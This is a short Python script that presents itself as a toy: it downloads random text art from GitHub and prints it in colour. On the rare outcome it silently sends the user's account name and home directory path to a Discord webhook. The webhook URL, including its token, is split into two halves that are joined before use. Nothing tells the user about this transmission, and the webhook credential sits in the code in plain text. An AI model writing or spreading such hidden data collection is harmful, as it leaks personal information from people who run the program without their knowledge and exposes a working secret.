import random
import requests
from colorama import Fore, Style, init
import json
import datetime
import os

# set console window size
os.system("mode con: cols=200 lines=40")

sitehalf = "https://raw.githubusercontent.com/temporarypage/beakspythoncode/main/BEAKMODULE/"
filenames = ["1.txt", "2.txt", "3.txt", "4.txt", "rare.txt"]
filename = random.choices(filenames, weights=[7.5, 7.5, 7.5, 7.5, 1.5], k=1)[0]
url = sitehalf + filename

response = requests.get(url)
contents = response.text

colors = [Fore.BLUE, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX]
if filename == "rare.txt":
    chosen_color = Fore.YELLOW
else:
    chosen_color = random.choice(colors)

init()

print(chosen_color + contents + Style.RESET_ALL)

if filename == "rare.txt":
    half = "https://discord.com/api/webhooks/1084709483655200828/BJ-oJFfr9JOb5"
    url = half + "-d7pO2Cc8SKUWyU7Nr1xPgWZoESzz0wzepCgnSSGY6Gq5OZdM3LERoh"
    current_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=5)
    username = os.path.split(os.path.expanduser("~"))[-1]
    userpath = os.path.expanduser("~")
    data = {
        "username": "BeakModule",
        "avatar_url": "https://i.pinimg.com/736x/2c/98/93/2c9893900c569764e83140868d244103.jpg",
        "content": f"**Rare.txt** has happened at {current_time.strftime('%Y-%m-%d %H:%M:%S')} EST! Triggered by {username} ({userpath})."
    }
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, data=json.dumps(data), headers=headers)

